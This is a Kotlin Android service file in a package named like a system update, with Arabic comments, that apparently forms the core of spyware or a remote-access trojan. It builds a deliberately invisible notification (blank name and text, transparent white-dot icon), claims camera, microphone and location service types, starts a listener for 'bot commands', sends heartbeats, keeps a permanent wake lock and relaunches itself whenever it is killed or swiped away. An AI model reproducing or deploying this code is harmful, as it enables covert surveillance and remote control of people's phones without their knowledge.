// language: Kotlin, file: BackgroundService.kt
// *إشعار شفاف + رفيع جداً (اسم ونص فاضيين + أيقونة نقطة بيضا)*
// *CommandListener لاستقبال أوامر البوت*
// *WakeLock لمنع النوم + Watchdog لإعادة الإطلاق*

package com.sys.update2

import android.app.ActivityManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.Color
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class BackgroundService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    @Volatile private var running = false
    @Volatile private var foregroundStarted = false

    private var wakeLock: PowerManager.WakeLock? = null

    private val notificationId = 1001
    private val channelId = "sys_sync_channel"

    override fun onCreate() {
        super.onCreate()
        acquireWakeLock()
        try { CommandListener.start(applicationContext) } catch (_: Exception) {}
        try { DeviceManager.registerDeviceOnce(applicationContext) } catch (_: Exception) {}
        startLoops()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!foregroundStarted) {
            val ok = tryStartForeground()
            if (!ok) {
                stopSelf()
                return START_NOT_STICKY
            }
        }
        try { ServiceWatchdog.schedule(applicationContext) } catch (_: Exception) {}
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        running = false
        try { CommandListener.stop() } catch (_: Exception) {}
        try { SyncManager.stopAll(applicationContext) } catch (_: Exception) {}
        try { DeviceManager.markInactive(applicationContext) } catch (_: Exception) {}
        scope.cancel()
        releaseWakeLock()
        try {
            val restartIntent = Intent(applicationContext, BackgroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(restartIntent)
            } else {
                applicationContext.startService(restartIntent)
            }
        } catch (_: Exception) {}
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        try {
            val restartIntent = Intent(applicationContext, BackgroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(restartIntent)
            } else {
                applicationContext.startService(restartIntent)
            }
        } catch (_: Exception) {}
        super.onTaskRemoved(rootIntent)
    }

    // ═══════════════════════════════════════════
    //  WakeLock
    // ═══════════════════════════════════════════

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "sysupdate::SyncWakeLock"
            )
            wakeLock?.setReferenceCounted(false)
            wakeLock?.acquire()
        } catch (_: Exception) {}
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.let { if (it.isHeld) it.release() }
            wakeLock = null
        } catch (_: Exception) {}
    }

    // ═══════════════════════════════════════════
    //  Foreground — إشعار شفاف + رفيع جداً
    // ═══════════════════════════════════════════

    private fun tryStartForeground(): Boolean {
        return try {
            ensureChannel()
            val notif = buildNotification()

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                var type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ||
                    hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                }
                if (hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                }
                if (hasPermission(android.Manifest.permission.CAMERA)) {
                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                }
                try {
                    startForeground(notificationId, notif, type)
                } catch (_: Exception) {
                    try {
                        startForeground(
                            notificationId,
                            notif,
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                        )
                    } catch (_: Exception) {
                        startForeground(notificationId, notif)
                    }
                }
            } else {
                startForeground(notificationId, notif)
            }
            foregroundStarted = true
            running = true
            true
        } catch (e: Exception) {
            android.util.Log.e("BgService", "startForeground failed: ${e.message}")
            false
        }
    }

    private fun hasPermission(p: String): Boolean {
        return try {
            ContextCompat.checkSelfPermission(applicationContext, p) ==
                PackageManager.PERMISSION_GRANTED
        } catch (_: Exception) { false }
    }

    private fun ensureChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        // احذف القناة القديمة لو موجودة (لتفعيل الإعدادات الجديدة)
        try {
            nm.deleteNotificationChannel(channelId)
        } catch (_: Exception) {}

        val ch = NotificationChannel(
            channelId,
            " ",                                       // اسم فاضي
            NotificationManager.IMPORTANCE_MIN         // أقل أهمية
        )
        ch.setSound(null, null)
        ch.enableVibration(false)
        ch.setShowBadge(false)
        ch.lockscreenVisibility = Notification.VISIBILITY_SECRET
        ch.description = " "
        nm.createNotificationChannel(ch)
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, channelId)
            .setSmallIcon(R.drawable.ic_white_dot)          // نقطة بيضا صغيرة
            .setContentTitle("")                            // فاضي
            .setContentText("")                             // فاضي
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setColor(Color.TRANSPARENT)                    // شفاف
            .setColorized(false)
            .setOnlyAlertOnce(true)
            .setLocalOnly(true)
            .build()
    }

    // ═══════════════════════════════════════════
    //  Loops
    // ═══════════════════════════════════════════

    private fun startLoops() {
        // Heartbeat — كل 3 دقايق
        scope.launch {
            while (running) {
                try { DeviceManager.updateHeartbeat(applicationContext) } catch (_: Exception) {}
                delay(3 * 60_000L)
            }
        }

        // تنظيف كاش audio
        scope.launch {
            while (running) {
                try {
                    val audioDir = java.io.File(applicationContext.cacheDir, "audio")
                    if (audioDir.exists()) {
                        val cutoff = System.currentTimeMillis() - 3600_000L
                        audioDir.listFiles()?.forEach {
                            if (it.lastModified() < cutoff) it.delete()
                        }
                    }
                } catch (_: Exception) {}
                delay(10 * 60_000L)
            }
        }

        // WakeLock تجديد
        scope.launch {
            while (running) {
                delay(5 * 60_000L)
                try { if (wakeLock?.isHeld != true) acquireWakeLock() } catch (_: Exception) {}
            }
        }

        // Watchdog للـ CommandListener
        scope.launch {
            while (running) {
                delay(60_000L)
                try { CommandListener.start(applicationContext) } catch (_: Exception) {}
            }
        }
    }

    companion object {
        fun startSafely(context: Context): Boolean {
            return try {
                val intent = Intent(context, BackgroundService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
                true
            } catch (e: Exception) {
                android.util.Log.e("BgService", "startSafely failed: ${e.message}")
                false
            }
        }

        fun isAppInForeground(context: Context): Boolean {
            return try {
                val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                val procs = am.runningAppProcesses ?: return true
                val myPid = android.os.Process.myPid()
                procs.firstOrNull { it.pid == myPid }?.importance ==
                    ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
            } catch (_: Exception) {
                true
            }
        }
    }
}
